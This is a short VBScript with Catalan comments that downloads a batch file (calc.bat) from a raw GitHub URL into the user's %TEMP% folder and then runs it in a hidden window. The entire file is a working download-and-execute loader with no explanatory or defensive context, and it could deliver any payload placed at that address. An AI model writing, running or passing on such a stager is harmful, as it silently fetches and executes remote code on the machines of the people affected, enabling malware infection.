' Configuració
Dim url, targetPath
url = "https://raw.githubusercontent.com/mcrumo/mcrumo.github.io/main/calc.bat"
targetPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\calc.bat"

' Descarregar el fitxer
Dim http, stream
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1 ' binary
    stream.Write http.ResponseBody
    stream.SaveToFile targetPath, 2 ' overwrite
    stream.Close
End If

' Executar el .bat descarregat
CreateObject("WScript.Shell").Run Chr(34) & targetPath & Chr(34), 0, True
